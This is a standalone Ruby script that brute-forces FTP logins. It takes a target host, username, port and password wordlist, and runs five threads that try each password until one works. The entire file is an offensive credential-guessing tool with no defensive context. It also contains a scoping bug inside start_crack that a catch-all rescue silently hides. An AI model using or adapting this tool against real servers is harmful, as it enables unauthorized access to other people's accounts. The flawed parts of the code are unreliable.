require 'net/ftp'

ftp_host_flag = ARGV.index("-host")
ftp_username_flag = ARGV.index("-username")
ftp_password_path_flag = ARGV.index("-wordlist")
ftp_port_flag = ARGV.index("-port")


if !ftp_host_flag || !ftp_username_flag || !ftp_password_path_flag || !ftp_port_flag
  puts "Usage: ruby ruby_ftp_cracker.rb -host the_host -username the_username -wordlist the_wordlist_path -port the_port"
  exit(1)
end

threads = []

ftp_host = ARGV[ftp_host_flag + 1].to_s
ftp_username = ARGV[ftp_username_flag + 1].to_s
ftp_wordlist = ARGV[ftp_password_path_flag + 1].to_s
ftp_port = ARGV[ftp_port_flag + 1].to_i

passwords = File.open(ftp_wordlist, 'r')

mutex = Mutex.new

$status = false

def start_crack(ftp_host, ftp_username, ftp_password, ftp_port, mutex)
  begin
    ftp = Net::FTP.new
    ftp.connect(ftp_host, ftp_port)
    ftp.login(ftp_username, ftp_password)
    puts "Password cracked: #{ftp_password}"
    $status = true
  rescue Net::FTPPermError
  ensure
    ftp.close if ftp
    mutex.synchronize do
      next_password = passwords.gets
      if next_password.nil?
        $passwords_closed = true
      end
    end
  end
end

num_threads = 5

$passwords_closed = false

num_threads.times do
  threads << Thread.new do
    while true
      password = nil
      mutex.synchronize do
        if $passwords_closed
          break
        else
          password = passwords.gets
        end
      end
      break if password.nil? 
      password.chomp!
      begin
        start_crack(ftp_host, ftp_username, password, ftp_port, mutex)
      rescue Exception => e
      end
    end
  end
end

threads.each(&:join)

if !$status
  puts "Password not found."
end

passwords.close
